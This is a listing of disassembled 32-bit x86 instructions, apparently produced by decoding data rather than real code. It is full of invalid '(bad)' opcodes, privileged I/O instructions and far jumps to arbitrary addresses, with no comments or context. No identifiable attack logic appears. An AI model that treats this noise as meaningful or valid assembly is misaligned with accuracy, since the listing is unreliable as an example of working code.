  41b72a:	stos   BYTE PTR es:[edi],al
  41b72b:	stc    
  41b72c:	pushf  
  41b72d:	xchg   DWORD PTR [ecx+0x69],ebx
  41b730:	(bad)  [ebx-0x4ec433cf]
  41b736:	mov    edx,0x74a903f7
  41b73b:	cmp    dl,dh
  41b73d:	setnp  BYTE PTR [ebx]
  41b740:	xchg   ebx,eax
  41b741:	dec    esp
  41b742:	pop    edi
  41b743:	xchg   ebp,eax
  41b744:	ret    0x495f
  41b747:	sbb    ch,bh
  41b749:	pusha  
  41b74a:	(bad)  [eax]
  41b74c:	push   0x35
  41b74e:	push   ebx
  41b74f:	not    DWORD PTR [eax+eax*8-0x4c6d965e]
  41b756:	loopne 0x41b7d3
  41b758:	sub    bl,BYTE PTR [esp+ebp*1+0xc]
  41b75c:	mov    bh,0x6d
  41b75e:	(bad)  
  41b75f:	xchg   edx,eax
  41b760:	or     DWORD PTR [edi+edi*2-0x15378625],ecx
  41b767:	test   BYTE PTR [ebp+0x4d],dl
  41b76a:	test   ch,cl
  41b76c:	bound  eax,QWORD PTR ds:0xed79e901
  41b772:	fcmovnb st,st(6)
  41b774:	pop    ds
  41b775:	push   ds
  41b776:	mov    cl,0xee
  41b778:	gs pop edi
  41b77a:	(bad)  
  41b77b:	addr16 call 0x14be:0x5b614777
  41b783:	ja     0x41b748
  41b785:	retf   
  41b786:	mov    dl,0xcf
  41b788:	dec    ecx
  41b789:	fwait
  41b78a:	xor    BYTE PTR [ebx+0x6c881b80],dl
  41b790:	push   esp
  41b791:	adc    eax,0xd2460e00
  41b796:	ret    0xd58a
  41b799:	jmp    0xe97d:0xa9bfd20d
  41b7a0:	fmul   st,st(0)
  41b7a2:	shl    ebx,0xb3
  41b7a5:	push   edx
  41b7a6:	sub    eax,0x59957b1
  41b7ab:	int    0x8b
  41b7ad:	push   esi
  41b7ae:	jno    0x41b7e8
  41b7b0:	mov    edx,0x3def7954
  41b7b5:	das    
  41b7b6:	mov    BYTE PTR [ebx+0x2c34ee8a],dh
  41b7bc:	lds    esi,FWORD PTR [bx]
  41b7bf:	xchg   dl,bh
  41b7c1:	test   eax,0xb1e1f622
  41b7c6:	sub    ch,dl
  41b7c8:	sub    al,0x98
  41b7ca:	sub    eax,0x1fd4c04d
  41b7cf:	mov    ah,BYTE PTR [eax]
  41b7d1:	pusha  
  41b7d2:	lods   al,BYTE PTR ds:[esi]
  41b7d3:	mov    cl,0x39
  41b7d5:	das    
  41b7d6:	stos   BYTE PTR es:[edi],al
  41b7d7:	clc    
  41b7d8:	push   ss
  41b7d9:	dec    esp
  41b7da:	stos   DWORD PTR es:[edi],eax
  41b7db:	dec    esp
  41b7dc:	dec    ecx
  41b7dd:	xchg   ecx,eax
  41b7de:	scas   al,BYTE PTR es:[edi]
  41b7df:	push   cs
  41b7e0:	sub    al,BYTE PTR [esi+0xb527779]
  41b7e6:	call   0x65d2:0xda0e415f
  41b7ed:	dec    esp
  41b7ee:	outs   dx,DWORD PTR ds:[esi]
  41b7ef:	ins    DWORD PTR es:[edi],dx
  41b7f0:	into   
  41b7f1:	nop
  41b7f2:	stos   DWORD PTR es:[edi],eax
  41b7f3:	ror    DWORD PTR [edx],0x2
  41b7f6:	xor    BYTE PTR ds:0x72ee1ec1,dh
  41b7fc:	hlt    
  41b7fd:	add    al,0x8c
  41b7ff:	repnz sub al,0xa8
  41b802:	ficom  WORD PTR [ebp-0x7400dbd1]
  41b808:	(bad)  
  41b809:	jmp    0x41b857
  41b80b:	pop    ss
  41b80c:	mov    DWORD PTR [edx+0xd1f7a9e],eax
  41b812:	cmp    dh,bh
  41b814:	neg    DWORD PTR [esi-0x6abf780a]
  41b81a:	out    0xc1,eax
  41b81c:	pop    esi
  41b81d:	repnz mov esp,0x418580b8
  41b823:	int3   
  41b824:	push   es
  41b825:	fnsave [esi+0x1c00bf7a]
  41b82b:	push   ds
  41b82c:	push   ebp
  41b82d:	xlat   BYTE PTR ds:[ebx]
  41b82e:	lods   al,BYTE PTR ds:[esi]
  41b82f:	cmp    ah,0x4b
  41b832:	test   BYTE PTR [eax-0x64],al
  41b835:	dec    esi
  41b836:	sar    BYTE PTR [edx+ebx*8],0xb
  41b83a:	jmp    0xddd75926
  41b83f:	fs xor al,0xff
  41b842:	(bad)  
  41b843:	add    DWORD PTR [ecx],ebp
  41b845:	outs   dx,BYTE PTR ds:[esi]
  41b846:	mov    ebp,ecx
  41b848:	out    0xf1,al
  41b84a:	lods   al,BYTE PTR ds:[esi]
  41b84b:	xor    BYTE PTR [edx+0x4881a922],ch
  41b851:	push   ss
  41b852:	std    
  41b853:	out    dx,al
  41b854:	push   ss
  41b855:	adc    DWORD PTR [edx],ecx
  41b857:	sti    
  41b858:	pop    ss
  41b859:	daa    
  41b85a:	fcom   QWORD PTR [esi]
  41b85c:	jno    0x41b8da
  41b85e:	je     0x41b8dd
  41b860:	pop    ebp
  41b861:	(bad)  
  41b862:	and    al,0x85
  41b864:	not    DWORD PTR [edx+0x64a05520]
  41b86a:	jnp    0x41b80c
  41b86c:	add    ebx,DWORD PTR [edx]
  41b86e:	fdivr  QWORD PTR [esi-0x6255cdbe]
  41b874:	mov    bh,0x6b
  41b876:	cmp    ecx,ecx
  41b878:	scas   eax,DWORD PTR es:[edi]
  41b879:	push   cs
  41b87a:	outs   dx,DWORD PTR ds:[esi]
  41b87b:	(bad)  
  41b87c:	enter  0x2f14,0xed
  41b880:	and    BYTE PTR [eax-0x46],dl
  41b883:	lds    ecx,FWORD PTR [esp+edx*8+0xd]
  41b887:	hlt    
  41b888:	pop    eax
  41b889:	das    
  41b88a:	sub    esp,edi
  41b88c:	cmp    BYTE PTR [ecx-0x12],bl
  41b88f:	adc    dh,0x80
  41b892:	cli    
  41b893:	adc    DWORD PTR [edx-0x7be5ee9],esi
  41b899:	add    al,0xeb
  41b89b:	stc    
  41b89c:	jge    0x41b8e9
  41b89e:	xchg   edi,eax
  41b89f:	pop    eax
  41b8a0:	xchg   edx,eax
  41b8a1:	ins    BYTE PTR es:[edi],dx
  41b8a2:	jo     0x41b868
  41b8a4:	mov    ah,0x8f
  41b8a6:	loop   0x41b8da
  41b8a8:	or     BYTE PTR [eax-0x7b],0x96
  41b8ac:	and    BYTE PTR [esi-0x64],bh
  41b8af:	xchg   ebp,eax
  41b8b0:	jbe    0x41b8d7
  41b8b2:	jg     0x41b8e9
  41b8b4:	icebp  
  41b8b5:	stos   DWORD PTR es:[edi],eax
  41b8b6:	lds    ebx,FWORD PTR [esi]
  41b8b8:	nop
  41b8b9:	cmp    ah,al
  41b8bb:	push   es
  41b8bc:	ret    0x245d
  41b8bf:	pop    ebp
  41b8c0:	rcr    DWORD PTR [ebx+0x7467eb69],0xf8
  41b8c7:	test   al,0x92
  41b8c9:	ficomp DWORD PTR [edi+0x78942f6c]
  41b8cf:	pop    esi
  41b8d0:	mov    bl,0xce
  41b8d2:	sbb    al,0x1
  41b8d4:	jecxz  0x41b880
  41b8d6:	adc    al,0xc6
  41b8d8:	push   cs
  41b8d9:	sub    ah,ch
  41b8db:	xor    DWORD PTR [edx+esi*8],0x2872579a
  41b8e2:	xor    dh,BYTE PTR [edx+0x4fae89e6]
  41b8e8:	loope  0x41b955
  41b8ea:	iret   
  41b8eb:	imul   ecx,DWORD PTR [eax-0x59c3b64a],0xd1421726
  41b8f5:	je     0x41b914
  41b8f7:	or     eax,0xed583bdf
  41b8fc:	inc    edx
  41b8fd:	dec    edi
  41b8fe:	fld    st(5)
  41b900:	and    esp,eax
  41b902:	inc    ebx
  41b903:	sti    
  41b904:	pop    ebp
  41b905:	iret   
  41b906:	scas   eax,DWORD PTR es:[edi]
  41b907:	enter  0x8105,0x21
  41b90b:	cli    
  41b90c:	push   edx
  41b90d:	rcl    BYTE PTR [edi],0xf3
  41b910:	mov    esi,0x1b732b2e
  41b915:	cmp    cl,BYTE PTR [edi]
  41b917:	scas   eax,DWORD PTR es:[edi]
  41b918:	add    cl,BYTE PTR [ebx+0x30e9fc55]
  41b91e:	add    al,BYTE PTR [eax]
  41b920:	add    dh,al
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x6421deca]
  41b92f:	(bad)  
  41b930:	(bad)  
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b993
  41b93a:	sub    DWORD PTR [edx-0xb38d85],esi
  41b940:	sbb    eax,0xa66bf5bc
  41b945:	clc    
  41b946:	mov    DWORD PTR [edx],edi
  41b948:	push   esi
  41b949:	sbb    eax,0x995d8d3d
  41b94e:	jl     0x41b92d
  41b950:	mov    cl,0x6e
  41b952:	inc    edx
  41b953:	or     dh,BYTE PTR [ecx+eiz*4+0x60c1e442]
  41b95a:	icebp  
  41b95b:	sub    al,0x31
  41b95d:	dec    esi
  41b95e:	pop    es
  41b95f:	stc    
  41b960:	arpl   bx,bx
  41b962:	push   ecx
  41b963:	pushf  
  41b964:	dec    esi
  41b965:	daa    
  41b966:	xlat   BYTE PTR ds:[ebx]
  41b967:	dec    ecx
  41b968:	and    eax,DWORD PTR [esi+edx*2]
  41b96b:	push   es
  41b96c:	pushf  
  41b96d:	lds    esi,FWORD PTR [edx+ebx*2-0xa40d50c]
  41b974:	out    dx,eax
  41b975:	add    al,0x3f
  41b977:	les    eax,FWORD PTR [ecx-0x4e25d7fe]
  41b97d:	(bad)  
  41b97e:	push   ebx
  41b97f:	sbb    DWORD PTR [edx],0x14
  41b982:	mov    ch,0xea
  41b984:	jmp    0x41b9e3
  41b986:	icebp  
  41b987:	addr16 arpl bp,si
  41b98a:	xchg   ah,dl
  41b98c:	arpl   WORD PTR [edx-0x44],di
  41b98f:	mov    ch,BYTE PTR [eax-0x3b9dbc13]
  41b995:	xor    BYTE PTR [edx-0x6a],dh
  41b998:	sub    BYTE PTR [ebx+0x38260839],al
  41b99e:	idiv   BYTE PTR [edi+edx*8-0x4b]
  41b9a2:	push   ds
  41b9a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a4:	popf   
  41b9a5:	int    0x52
  41b9a7:	daa    
  41b9a8:	mov    ds:0xf682d41d,eax
  41b9ad:	xchg   esi,eax
  41b9ae:	sbb    BYTE PTR [ebp-0x10f25226],ah
  41b9b4:	sar    DWORD PTR [edi+ecx*2],1
  41b9b7:	enter  0x9aa8,0xcf
  41b9bb:	jae    0x41b9d2
  41b9bd:	xor    BYTE PTR [edi+0x78],dl
  41b9c0:	sub    cl,BYTE PTR [edx]
  41b9c2:	mov    eax,0x45c265f9
  41b9c7:	ins    BYTE PTR es:[edi],dx
  41b9c8:	lahf   
  41b9c9:	mov    ebp,0x763f0b80
  41b9ce:	aaa    
  41b9cf:	sub    ah,bh
  41b9d1:	mov    ch,0xaf
  41b9d3:	jmp    0x41ba06
  41b9d5:	scas   eax,DWORD PTR es:[edi]
  41b9d6:	add    al,0xd2
  41b9d8:	push   edi
  41b9d9:	mov    ds,WORD PTR [edi-0x70]
  41b9dc:	xor    bl,dl
  41b9de:	push   ds
  41b9df:	sbb    edi,DWORD PTR [edx-0x74]
  41b9e2:	mov    al,ds:0xf41efe61
  41b9e7:	xchg   edx,eax
  41b9e8:	fwait
  41b9e9:	push   esp
  41b9ea:	aas    
  41b9eb:	xor    al,0xb2
  41b9ed:	push   esi
  41b9ee:	sbb    al,0x6a
  41b9f0:	fucomi st,st(3)
  41b9f2:	cdq    
  41b9f3:	test   eax,0x6f76c3fd
  41b9f8:	nop
  41b9f9:	xor    BYTE PTR [ecx-0x1f9ec91f],0x85
  41ba00:	rol    DWORD PTR [ecx+0x4f],0xe2
  41ba04:	imul   eax,edx,0x75
  41ba07:	js     0x41b9e2
  41ba09:	xor    eax,0xd62e15dd
  41ba0e:	xchg   edi,eax
  41ba0f:	xchg   BYTE PTR [ecx+ebp*2-0x1b],dl
  41ba13:	xchg   ecx,eax
  41ba14:	nop
  41ba15:	mov    ch,0x8b
  41ba17:	nop
  41ba18:	shl    edx,cl
  41ba1a:	bound  edi,QWORD PTR [edx+0x1cc82d56]
  41ba20:	inc    edx
  41ba21:	xor    al,0x26
  41ba23:	push   ebp
  41ba24:	mov    al,ds:0x9e093dbe
  41ba29:	pusha  
  41ba2a:	and    ebx,ecx
  41ba2c:	and    al,0x5c
  41ba2e:	fsubr  DWORD PTR [ebx-0x2833ff17]
  41ba34:	in     eax,dx
  41ba35:	xchg   esi,eax
  41ba36:	popf   
  41ba37:	lods   al,BYTE PTR ds:[esi]
  41ba38:	xchg   ebp,eax
  41ba39:	sti    
  41ba3a:	xchg   BYTE PTR [ebx-0x47fc5a70],ah
  41ba40:	xor    DWORD PTR [ecx+0x5f7a905a],ebx
  41ba46:	loopne 0x41b9ea
  41ba48:	test   BYTE PTR [eax],dh
  41ba4a:	jecxz  0x41ba9a
  41ba4c:	jge    0x41b9fb
  41ba4e:	enter  0x196f,0xef
  41ba52:	pusha  
  41ba53:	adc    al,BYTE PTR [edi+ebp*8-0x44]
  41ba57:	and    ecx,DWORD PTR [ecx+ebx*4+0x21f9e5df]
  41ba5e:	cmp    al,0x1a
  41ba60:	pop    ebp
  41ba61:	add    BYTE PTR [edi],ch
  41ba63:	mov    BYTE PTR [edx+eiz*1+0x377a907c],ch
  41ba6a:	xor    dh,bh
  41ba6c:	ins    DWORD PTR es:[edi],dx
  41ba6d:	push   edi
  41ba6e:	adc    eax,ebx
  41ba70:	bnd je 0x41ba08
  41ba73:	and    ebp,DWORD PTR [eax-0x18]
  41ba76:	dec    esp
  41ba77:	vaddsubps ymm3,ymm0,YMMWORD PTR [esi+0x77e0f1a4]
  41ba80:	out    0xed,al
  41ba82:	cld    
  41ba83:	push   0xffffffe4
  41ba85:	pop    edx
  41ba86:	pop    ss
  41ba87:	jecxz  0x41ba52
  41ba89:	dec    edi
  41ba8a:	mov    dh,0xfd
  41ba8c:	pushf  
  41ba8d:	(bad)  
  41ba8e:	jmp    0xabaa:0x51738ac5
  41ba95:	jp     0x41bb07
  41ba97:	stos   DWORD PTR es:[edi],eax
  41ba98:	mov    cl,BYTE PTR [ebp+0x4c]
  41ba9b:	sbb    ebp,DWORD PTR [edx-0x67]
  41ba9e:	mov    ds:0xb9e8e2ca,eax
  41baa3:	scas   eax,DWORD PTR es:[edi]
  41baa4:	mov    ds:0x4ccb7419,eax
  41baa9:	jae    0x41ba48
  41baab:	(bad)  
  41baac:	inc    eax
  41baad:	sahf   
  41baae:	mov    DWORD PTR [esi+0xe],eax
  41bab1:	popf   
  41bab2:	lahf   
  41bab3:	in     eax,0x31
  41bab5:	mov    ebp,0x77aa1ddb
  41baba:	jg     0x41ba70
  41babc:	loope  0x41ba50
  41babe:	add    bl,BYTE PTR [esi]
  41bac0:	dec    edi
  41bac1:	push   0x848644af
  41bac6:	addr16 add eax,0xbe3597b
  41bacc:	sbb    BYTE PTR [ecx+ecx*2],dl
  41bacf:	mov    al,ds:0x49cebe2b
  41bad4:	sub    dl,BYTE PTR [ebp-0x2b11c647]
  41bada:	inc    edx
  41badb:	sbb    eax,0xdd22abc
  41bae0:	jo     0x41bafc
  41bae2:	call   0x127aa821
  41bae7:	addr16 loop 0x41ba7a
  41baea:	cs stos BYTE PTR es:[edi],al
  41baec:	inc    esp
  41baed:	sub    BYTE PTR [edi+0x20bc3cd9],cl
  41baf3:	sub    ecx,edi
  41baf5:	fstp   TBYTE PTR [ebp-0x66]
  41baf8:	int    0x6e
  41bafa:	and    al,0x66
  41bafc:	cwde   
  41bafd:	fist   DWORD PTR [edx-0x75a63148]
  41bb03:	arpl   bp,dx
  41bb05:	stc    
  41bb06:	adc    eax,0x1ece30cc
  41bb0b:	sbb    al,BYTE PTR [edx]
  41bb0d:	cs mov esp,0x76c05f0f
  41bb13:	(bad)  
  41bb14:	aaa    
  41bb15:	or     al,0xbe
  41bb17:	push   edx
  41bb18:	je     0x41baa6
  41bb1a:	xor    BYTE PTR [ebp+0x7b],ch
  41bb1d:	int    0xdd
  41bb1f:	sahf   
  41bb20:	call   0x43739d4a
  41bb25:	wbinvd 
  41bb27:	or     DWORD PTR [eax+0x15bac2aa],ebx
  41bb2d:	pop    edi
  41bb2e:	jbe    0x41bba6
  41bb30:	mov    WORD PTR [edi],ds
  41bb32:	or     al,0xb2
  41bb34:	add    BYTE PTR [ecx],cl
  41bb36:	in     al,dx
  41bb37:	scas   eax,DWORD PTR es:[edi]
  41bb38:	pop    ebp
  41bb39:	in     al,dx
  41bb3a:	cs add eax,0x76bed016
  41bb40:	sub    DWORD PTR [esi],edi
  41bb42:	loopne 0x41bb5a
  41bb44:	test   BYTE PTR [edi+0x428084e1],0xee
  41bb4b:	icebp  
  41bb4c:	sub    al,0xa1
  41bb4e:	or     edi,DWORD PTR [edx-0x67]
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xc717bf12
  41bb65:	add    edx,DWORD PTR [edx]
  41bb67:	jg     0x41baf1
  41bb69:	in     al,0x7f
  41bb6b:	js     0x41bb7d
  41bb6d:	jle    0x41bbe7
  41bb6f:	js     0x41bb63
  41bb71:	mov    bl,0x40
  41bb73:	xor    bh,dh
  41bb75:	std    
  41bb76:	nop
  41bb77:	ret    
  41bb78:	stos   BYTE PTR es:[edi],al
  41bb79:	sub    ah,BYTE PTR [edi+0x3aaf8855]
  41bb7f:	jo     0x41bb43
  41bb81:	sbb    DWORD PTR [ecx+0xbd695b9],ebx
  41bb87:	sub    al,0xe3
  41bb89:	clc    
  41bb8a:	shl    DWORD PTR [ecx],1
  41bb8c:	ss inc eax
  41bb8e:	bound  esp,QWORD PTR [ebp+0x2b850e7f]
  41bb94:	sbb    esi,ebp
  41bb96:	sub    al,0xc2
  41bb98:	mov    esp,ebp
  41bb9a:	(bad)  
  41bb9c:	lock add dl,0xd6
  41bba0:	jg     0x41bbad
  41bba2:	mov    ds:0x29b42aa3,eax
  41bba7:	sbb    al,0x35
  41bba9:	adc    esi,edx
  41bbab:	mov    eax,ds:0x1b9d2dcd
  41bbb0:	das    
  41bbb1:	(bad)  
  41bbb2:	call   0xa41a198e
  41bbb7:	inc    esp
  41bbb8:	and    eax,DWORD PTR [ebx]
  41bbba:	inc    ecx
  41bbbb:	lods   eax,DWORD PTR ds:[esi]
  41bbbc:	mov    esp,DWORD PTR [ecx+0x2d]
  41bbbf:	pushf  
  41bbc0:	aad    0x7
  41bbc2:	cmp    ah,BYTE PTR [edi]
  41bbc4:	sub    eax,0x2eeb99cf
  41bbc9:	xchg   DWORD PTR [ebx+0x6c3537ef],ebx
  41bbcf:	jne    0x41bbfd
  41bbd1:	repnz retf 
  41bbd3:	mov    eax,0x3b4d9549
  41bbd8:	mov    WORD PTR [eax+0x15d6498c],es
  41bbde:	popa   
  41bbdf:	ins    DWORD PTR es:[edi],dx
  41bbe0:	cmp    al,0xb0
  41bbe2:	(bad)  
  41bbe3:	ins    BYTE PTR es:[edi],dx
  41bbe4:	ret    0xfe6f
  41bbe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbe8:	sahf   
  41bbe9:	repnz out 0x60,al
  41bbec:	je     0x41bba8
  41bbee:	xor    BYTE PTR [ebp+esi*8-0x14],dl
  41bbf2:	je     0x41bc17
  41bbf4:	pop    esp
  41bbf5:	in     al,dx
  41bbf6:	mov    al,0x88
  41bbf8:	add    DWORD PTR [edi+0x1625b734],ebx
  41bbfe:	and    BYTE PTR [edi],bh
  41bc00:	pop    ds
  41bc01:	push   0xba3421c5
  41bc06:	pop    es
  41bc07:	jecxz  0x41bbcc
  41bc09:	mov    ch,BYTE PTR [edx-0x33]
  41bc0c:	mov    ds:0x7ef75a78,eax
  41bc11:	test   BYTE PTR [ebx+0x46],cl
  41bc14:	xchg   ecx,eax
  41bc15:	mov    ds,esp
  41bc17:	adc    ebp,DWORD PTR [edi]
  41bc19:	xor    DWORD PTR [ecx-0x52a75a4e],edx
  41bc1f:	nop
  41bc20:	fdiv   QWORD PTR [esi+0x51]
  41bc24:	les    ebp,FWORD PTR [ebx]
  41bc26:	jp     0x41bc35
  41bc28:	rcl    edi,0x8e
  41bc2b:	pop    ebx
  41bc2c:	push   eax
  41bc2d:	dec    esp
  41bc2e:	xor    al,0x48
  41bc30:	and    cl,BYTE PTR [ecx+0x56]
  41bc33:	arpl   WORD PTR [edx],bp
  41bc35:	into   
  41bc36:	jno    0x41bc9a
  41bc38:	dec    DWORD PTR [ecx-0x3a5c8d5c]
  41bc3e:	fistp  WORD PTR [edx+edi*4-0x5f5b84cd]
  41bc45:	lahf   
  41bc46:	push   edx
  41bc47:	cmc    
  41bc48:	jns    0x41bc42
  41bc4a:	mov    dh,0x6f
  41bc4c:	mov    ecx,0xec645e73
  41bc51:	xchg   esp,eax
  41bc52:	iret   
  41bc53:	pop    edx
  41bc54:	(bad)  
  41bc55:	ffreep st(1)
  41bc57:	adc    BYTE PTR [ecx-0xa9b2f17],bh
  41bc5d:	nop
  41bc5e:	test   BYTE PTR [ebx+0x7149b45e],cl
  41bc64:	in     al,0x6c
  41bc66:	jbe    0x41bc6d
  41bc68:	pop    ds
  41bc69:	mov    ah,0x4d
  41bc6b:	es into 
  41bc6d:	iret   
  41bc6e:	mov    bh,0x6
  41bc70:	repz dec ecx
  41bc72:	test   eax,0x759bd0d4
  41bc77:	xor    eax,0xc1b43385
  41bc7c:	dec    ebx
  41bc7d:	(bad)  
  41bc7e:	pusha  
  41bc7f:	(bad)  
  41bc80:	jns    0x41bcd6
  41bc82:	imul   ebp,DWORD PTR [ecx+0x31],0x3f
  41bc86:	aad    0xfe
  41bc88:	mov    dl,0x93
  41bc8a:	or     eax,0xb7a68136
  41bc8f:	jg     0x41bc5e
  41bc91:	xor    BYTE PTR [ebp-0x41cc06de],cl
  41bc97:	cmc    
  41bc98:	pop    ds
  41bc99:	lahf   
  41bc9a:	addr16 lock xchg ecx,eax
  41bc9d:	mov    esi,0xcb46e84e
  41bca2:	cmp    eax,0x47c8cfbe
  41bca7:	adc    bh,BYTE PTR [esi+0x484d742c]
  41bcad:	cmc    
  41bcae:	push   edi
  41bcaf:	(bad)  
  41bcb0:	mov    ebp,0x395f4ef0
  41bcb5:	xchg   edi,eax
  41bcb6:	ficomp DWORD PTR [edi+0x9]
  41bcb9:	arpl   WORD PTR [edi+0x5616c746],si
  41bcbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcc0:	jne    0x41bc5b
  41bcc2:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41bcc4:	pop    eax
  41bcc5:	in     al,dx
  41bcc6:	cmp    eax,DWORD PTR [ecx+0x7e]
  41bcc9:	fucomip st,st(3)
  41bccb:	jg     0x41bd39
  41bccd:	ins    DWORD PTR es:[edi],dx
  41bcce:	cwde   
  41bccf:	mov    edx,0x3568dd44
  41bcd4:	lods   al,BYTE PTR ds:[esi]
  41bcd5:	stos   BYTE PTR es:[edi],al
  41bcd6:	loopne 0x41bd30
  41bcd8:	pop    ss
  41bcd9:	js     0x41bc80
  41bcdb:	inc    esp
  41bcdc:	sbb    eax,0x6b404505
  41bce1:	popf   
  41bce2:	adc    ecx,esp
  41bce4:	aad    0xb4
  41bce6:	test   ecx,ebp
  41bce8:	and    DWORD PTR [edi-0x1edda2d6],edx
  41bcee:	push   ss
  41bcef:	dec    esp
  41bcf0:	cmp    eax,DWORD PTR [edx+0x35e4616c]
  41bcf6:	push   eax
  41bcf7:	push   eax
  41bcf8:	mov    eax,ds:0xaba028b2
  41bcfd:	cmp    bh,BYTE PTR [ebp-0x30]
  41bd00:	pop    ss
  41bd01:	push   ecx
  41bd02:	cmp    eax,0x14d9d404
  41bd07:	xor    al,0xfc
  41bd09:	mov    bl,al
  41bd0b:	int    0xad
  41bd0d:	ss stos BYTE PTR es:[edi],al
  41bd0f:	jbe    0x41bd27
  41bd11:	int    0xd7
  41bd13:	mov    ebx,0xffd3d334
  41bd18:	in     al,dx
  41bd19:	jo     0x41bcde
  41bd1b:	add    ch,dl
  41bd1d:	lahf   
  41bd1e:	jbe    0x41bd46
  41bd20:	fdivp  st(1),st
  41bd22:	mov    eax,esi
  41bd24:	sbb    ebp,ecx
  41bd26:	(bad)  
  41bd29:	ss call 0x7dec:0x12a3e09b
  41bd31:	fs dec ebx
  41bd33:	inc    eax
  41bd34:	fbstp  TBYTE PTR [ecx+0x4d]
  41bd37:	and    al,0xff
  41bd39:	cld    
  41bd3a:	jl     0x41bcd3
  41bd3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd3d:	jbe    0x41bd9d
  41bd3f:	xor    bl,BYTE PTR [eax+0x71cbfcdf]
  41bd45:	call   0xdbf5b2db
  41bd4a:	js     0x41bdb7
  41bd4c:	dec    ecx
  41bd4d:	mov    ch,0x6f
  41bd4f:	ret    0x17ac
  41bd52:	jp     0x41bd15
  41bd54:	stos   BYTE PTR es:[edi],al
  41bd55:	loop   0x41bd94
  41bd57:	loopne 0x41bd09
  41bd59:	sub    ebp,DWORD PTR [edi-0x574ea75f]
  41bd5f:	jae    0x41bd65
  41bd61:	inc    edi
  41bd62:	aam    0xfe
  41bd64:	sub    dh,BYTE PTR [ebp+edx*8-0x99976f1]
  41bd6b:	js     0x41bde3
  41bd6d:	sbb    al,BYTE PTR [eax+0x13]
  41bd70:	jmp    0xd0866668
  41bd75:	add    DWORD PTR [eax+0x6c],0x854290cb
  41bd7c:	mov    ebx,DWORD PTR [ecx-0x5f]
  41bd7f:	call   0x91d94c08
  41bd84:	fcom   DWORD PTR [ecx+0x4d8bbb8f]
  41bd8a:	or     cl,ch
  41bd8c:	xor    BYTE PTR [edx],al
  41bd8e:	add    BYTE PTR [eax],al
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xfffffff3
  41bd9d:	sbb    al,0x32
  41bd9f:	mov    esp,DWORD PTR [eax+0x10787fea]
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41be1f
  41bda9:	das    
  41bdaa:	add    ah,ch
  41bdac:	xchg   ch,dl
  41bdae:	in     al,0x63
  41bdb0:	test   dl,bh
  41bdb2:	neg    eax
  41bdb4:	fcmovbe st,st(5)
  41bdb6:	vaddpd xmm2,xmm1,xmm4
  41bdba:	popf   
  41bdbb:	retf   0x917a
  41bdbe:	outs   dx,DWORD PTR ds:[esi]
  41bdbf:	xchg   esp,eax
  41bdc0:	bound  edi,QWORD PTR [ebx+0x560f9f89]
  41bdc6:	pusha  
  41bdc7:	xlat   BYTE PTR ds:[ebx]
  41bdc8:	scas   al,BYTE PTR es:[edi]
  41bdc9:	pop    esp
  41bdca:	cmp    al,0xe
  41bdcc:	or     bh,BYTE PTR [ebp+eiz*2-0x53]
  41bdd0:	and    al,0xf7
  41bdd2:	(bad)  
  41bdd4:	call   0xf57a:0x1a609137
  41bddb:	out    0x62,eax
  41bddd:	ret    0x8db5
  41bde0:	repnz pop edx
  41bde2:	in     al,0x50
  41bde4:	cmp    esi,edx
  41bde6:	mov    ch,0x7c
  41bde8:	xor    al,0x5d
  41bdea:	sub    cl,BYTE PTR [ebp+0x28]
  41bded:	add    eax,0x87db1424
  41bdf2:	pop    esi
  41bdf3:	pop    ecx
  41bdf4:	adc    BYTE PTR [eax+0x7048fe12],bh
  41bdfa:	add    al,0x25
  41bdfc:	jge    0x41bd89
  41bdfe:	icebp  
  41bdff:	adc    esp,esi
  41be01:	leave  
  41be02:	or     al,0x70
  41be04:	test   al,al
  41be06:	sbb    al,BYTE PTR [eax]
  41be08:	pop    es
  41be09:	ja     0x41be3c
  41be0b:	dec    edx
  41be0c:	jmp    0xe2b3261
  41be11:	das    
  41be12:	add    DWORD PTR [edx+0x77837acf],ebp
  41be18:	call   0x7c35:0xb33b1fc1
  41be1f:	test   esp,esi
  41be21:	mov    ds:0x5c18d1d0,eax
  41be26:	push   edx
  41be27:	out    0x8e,al
  41be29:	aaa    
  41be2a:	xchg   ebp,eax
  41be2b:	xchg   esi,eax
  41be2c:	inc    edi
  41be2d:	loop   0x41be6e
  41be2f:	js     0x41bdbd
  41be31:	dec    edi
  41be32:	arpl   WORD PTR [ebx],di
  41be34:	popf   
  41be35:	mov    edx,0x55e6d831
  41be3a:	pop    edx
  41be3b:	pop    es
  41be3c:	xchg   BYTE PTR [eax+0x23],ch
  41be3f:	push   esp
  41be40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be41:	fcmove st,st(3)
  41be43:	add    eax,0xbe69ea38
  41be48:	shl    BYTE PTR [eax-0x42],cl
  41be4b:	fadd   DWORD PTR [esi+0xf]
  41be4e:	sub    BYTE PTR [edx+esi*1-0x7698c0ca],al
  41be55:	xchg   esi,eax
  41be56:	(bad)  
  41be57:	push   DWORD PTR [eax-0x64233ea3]
  41be5d:	mov    ecx,0xdcb74ffb
  41be62:	cmp    BYTE PTR ds:0x232a744e,ah
  41be68:	inc    ecx
  41be69:	jb     0x41bee6
  41be6b:	mov    al,0x87
  41be6d:	jmp    0x41be79
  41be6f:	add    bh,bl
  41be71:	mov    ebx,0xf5e6a16a
  41be76:	popf   
  41be77:	cmp    bl,dh
  41be79:	nop
  41be7a:	jb     0x41be47
  41be7c:	sahf   
  41be7d:	outs   dx,BYTE PTR ds:[esi]
  41be7e:	mov    ecx,0x6c2b047c
  41be83:	out    dx,eax
